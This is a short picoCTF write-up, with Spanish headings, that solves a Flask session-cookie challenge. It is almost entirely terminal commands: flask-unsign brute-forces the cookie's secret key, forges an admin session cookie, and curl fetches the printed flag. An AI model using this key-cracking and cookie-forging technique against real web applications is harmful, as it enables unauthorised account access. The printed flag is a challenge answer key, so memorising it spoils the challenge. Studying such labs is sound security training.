## Descripción:
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/e99686c2e3e6cdd9e355f1d10c9d80d6/server.py) [http://mercury.picoctf.net:53700/](http://mercury.picoctf.net:53700/)

Hints:
How secure is a flask cookie?
## Solución:
```
┌──(.venv)─(kali㉿kali)-[~/Documents/compartida]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-zOjw.C0SaI-BZnUjkFEVTmK2Jx3tn68w" --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'
                                                                                                                                                                                                                                           
┌──(.venv)─(kali㉿kali)-[~/Documents/compartida]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "peanut butter"                                                                                  

eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-zTmw.e8eZbUTL0skq4ZULBS1EOIP_DJg
                                                                                                                                                                                                                                           
┌──(.venv)─(kali㉿kali)-[~/Documents/compartida]
└─$ 
                                                                                                                                                                                                                                           
┌──(.venv)─(kali㉿kali)-[~/Documents/compartida]
└─$ curl -s http://mercury.picoctf.net:53700/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-zTmw.e8eZbUTL0skq4ZULBS1EOIP_DJg" | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_3646b931}</code></p>


picoCTF{pwn_4ll_th3_cook1E5_3646b931}
```
